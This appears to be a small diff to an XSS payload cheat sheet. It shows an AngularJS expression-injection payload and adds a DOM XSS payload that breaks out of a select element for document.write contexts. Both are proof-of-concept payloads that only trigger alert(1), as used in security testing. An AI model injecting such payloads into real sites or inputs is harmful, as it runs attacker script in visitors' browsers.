@@ -109,4 +109,7 @@ AngularJS Expression Injection
 {{constructor.constructor('alert(1)')()}}
 ```
 DOM XSS (document.write)
-html
+```html
+</select><img src=x onerror=alert(1)>
+```
+
